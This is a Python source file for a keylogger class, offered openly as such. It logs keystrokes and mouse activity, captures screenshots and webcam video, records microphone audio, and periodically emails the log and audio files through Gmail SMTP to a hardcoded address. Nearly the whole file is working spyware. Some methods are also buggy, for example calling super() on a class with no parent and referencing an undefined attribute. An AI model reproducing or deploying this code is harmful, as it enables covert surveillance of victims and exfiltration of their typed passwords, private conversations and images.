from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
from PIL import ImageGrab
import time
import pyaudio
import cv2
import wave
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import logging

SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
SMTP_USERNAME = 'lukbr25@gmail.com'
SMTP_PASSWORD = ''

logging.basicConfig(filename="error.log", level=logging.ERROR, 
                    format="%(asctime)s:%(levelname)s:%(message)s")

class Keylogger:
    def __init__(self, max_count=10, log_file="log.txt", interval=60, idle_time=300):
        """
        Initializes the Keylogger object.

        Args:
            max_count (int): The maximum number of keys to log before writing to the log file.
            log_file (str): The name of the file to write the log to.
            interval (int): The interval in seconds at which to capture the screen and record audio.
            idle_time (int): The amount of time in seconds after which to consider the user as idle.

        Attributes:
            video_capture (cv2.VideoCapture): The object used to capture video.
            video_writer (cv2.VideoWriter): The object used to write video frames.
            count (int): The number of keys logged so far.
            keys (list): A list of keys that have been pressed.
            mouse_events (list): A list of mouse events that have occurred.
            max_count (int): The maximum number of keys to log before writing to the log file.
            log_file (str): The name of the file to write the log to.
            interval (int): The interval in seconds at which to capture the screen and record audio.
            idle_time (int): The amount of time in seconds after which to consider the user as idle.
            last_capture_time (float): The time of the last screen capture.
            last_email_time (float): The time of the last email send.
            last_activity_time (float): The time of the last user activity.
            is_active (bool): A flag indicating whether the user is currently active.
        """
        self.video_capture = cv2.VideoCapture(0)
        self.video_writer = None
        self.count = 0
        self.keys = []
        self.mouse_events = []
        self.max_count = max_count
        self.log_file = log_file
        self.interval = interval
        self.idle_time = idle_time
        self.last_capture_time = time.time()
        self.last_email_time = time.time()
        self.last_activity_time = time.time()
        self.is_active = True  # added flag to indicate user activity

    def on_press(self, key):
        """
        Logs a pressed key and performs periodic screen captures, audio recordings and email sends.

        Args:
            key (pynput.keyboard.Key): The key that was pressed.
        """
        try:
            if self.is_active:  # added check to capture keys and mouse movements only when user is active
                self.keys.append(key)
                self.count += 1
                print(f"{key} pressed")

                if self.count >= self.max_count:
                    self.write_file()
                    self.count = 0
                    self.keys = []

                current_time = time.time()
                if current_time - self.last_capture_time >= self.interval:
                    self.capture_screen()
                    self.record_audio()  # added line to record audio
                    self.last_capture_time = current_time

                if current_time - self.last_email_time >= self.interval * 60:
                    self.send_email()
                    self.last_email_time = current_time

            self.check_idle(current_time)  # moved from the end of the method
        except Exception as e:
            logging.error(f"Error in on_press method: {e}")

    def check_idle(self, current_time):
        try:
            if current_time - self.last_activity_time >= self.idle_time:
                self.is_active = False
                Listener.stop_listening(self)  # modified this line
            else:
                self.is_active = True
                self.last_activity_time = current_time
        except Exception as e:
            logging.error(f"Error in check_idle method: {e}")

    def stop_listening(self):
        try:
            self.video_capture.release()

            if self.video_writer is not None:
                self.video_writer.release()

            super().stop_listening()
        except Exception as e:
            logging.error(f"Error in stop_listening method: {e}")

    def on_move(self, x, y):
        try:
            if self.is_active:  # added check to capture mouse movements only when user is active
                self.mouse_events.append(('move', x, y))
                self.last_activity_time = time.time()
        except Exception as e:
            logging.error(f"Error in on_move method: {e}")

    def on_click(self, x, y, button, pressed):
        try:
            if self.is_active:  # added check to capture mouse movements only when user is active
                if pressed:
                    self.mouse_events.append(('click', x, y, button))
                    self.last_activity_time = time.time()
        except Exception as e:
            logging.error(f"Error in on_click method: {e}")

    def on_scroll(self, x, y, dx, dy):
        try:
            if self.is_active:  # added check to capture mouse movements only when user is active
                self.mouse_events.append(('scroll', x, y, dx, dy))
                self.last_activity_time = time.time()
        except Exception as e:
            logging.error(f"Error in on_scroll method: {e}")

    def send_email(self):
        try:
            msg = MIMEMultipart()
            msg['From'] = SMTP_USERNAME
            msg['To'] = SMTP_USERNAME
            msg['Subject'] = 'Log file'

            with open(self.log_file, "rb") as f, open('audio.wav', "rb") as af:
                file_data = f.read()
                audio_data = af.read()
                attachment = MIMEApplication(file_data, _subtype="txt")
                attachment.add_header('Content-Disposition', 'attachment', filename=self.log_file)
                msg.attach(attachment)
                audio_attachment = MIMEApplication(audio_data, _subtype="wav")
                audio_attachment.add_header('Content-Disposition', 'attachment', filename='audio.wav')
                msg.attach(audio_attachment)

            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(SMTP_USERNAME, SMTP_PASSWORD)
                server.sendmail(SMTP_USERNAME, SMTP_USERNAME, msg.as_string())

            print('Email sent successfully')
        except Exception as e:
            logging.error(f'Error sending email: {e}')


    def record_audio(self):
        try:
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            RECORD_SECONDS = 5
            WAVE_OUTPUT_FILENAME = 'audio.wav'

            p = pyaudio.PyAudio()

            stream = p.open(format=FORMAT,
                            channels=CHANNELS,
                            rate=RATE,
                            input=True,
                            frames_per_buffer=CHUNK)

            frames = []

            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)

            stream.stop_stream()
            stream.close()
            p.terminate()

            wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

            print(f"Audio recorded and saved as {self.WAVE_OUTPUT_FILENAME}")
        except Exception as e:
            print(f"Error recording audio: {e}")


    def write_file(self):
        try:
            with open(self.log_file, "a") as f:
                for key in self.keys:
                    k = str(key).replace("'", "")
                    if "space" in k:
                        f.write("\n")
                    elif "Key" not in k:
                        f.write(k)
                for event in self.mouse_events:
                    f.write(str(event) + '\n')
        except Exception as e:
            print(f"Error writing to file: {e}")


    def on_release(self, key):
        try:
            if key == Key.esc:
                return False

            self.mouse_events.append(key)
            print(f"{key} released")

            self.check_idle(time.time())
        except Exception as e:
            print(f"Error on key release: {e}")
   
    def start(self):
        try:
            with Listener(on_press=self.on_press, on_release=self.on_release) as listener, \
                    MouseListener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll) as mouse_listener:
                listener.join()
        except Exception as e:
            print(f"Error starting listener: {e}")


    def capture_screen(self):
        try:
            filename = f"{int(time.time() * 1000)}.png"
            im = ImageGrab.grab()
            im.save(filename)
            print(f"Screenshot saved as {filename}")
            
            ret, frame = self.video_capture.read()

            if ret:
                if self.video_writer is None:
                    fourcc = cv2.VideoWriter_fourcc(*'XVID')
                    filename = time.strftime("video_%Y%m%d_%H%M%S.avi")
                    self.video_writer = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))

                self.video_writer.write(frame)
            else:
                print("Failed to capture video.")

            super().capture_screen()
        except Exception as e:
            print(f"Error capturing screen: {e}")


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()


